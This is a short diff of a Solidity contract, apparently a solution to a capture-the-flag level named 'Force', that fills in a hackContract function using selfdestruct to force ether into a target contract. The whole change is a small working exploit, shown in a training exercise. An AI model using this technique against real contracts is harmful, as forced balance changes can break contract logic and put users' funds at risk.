@@ -2,6 +2,10 @@
 pragma solidity ^0.8.9;
 import "./Force.sol";
 
+/*
+ * Self-destruct removes bytecode from the current address and sends all remaining eth balance to the target address.
+ */
+
 contract AttackingForce {
     address public contractAddress;
 
@@ -9,7 +13,7 @@ contract AttackingForce {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    function hackContract() external payable {
+        selfdestruct(payable(contractAddress));
     }
 }
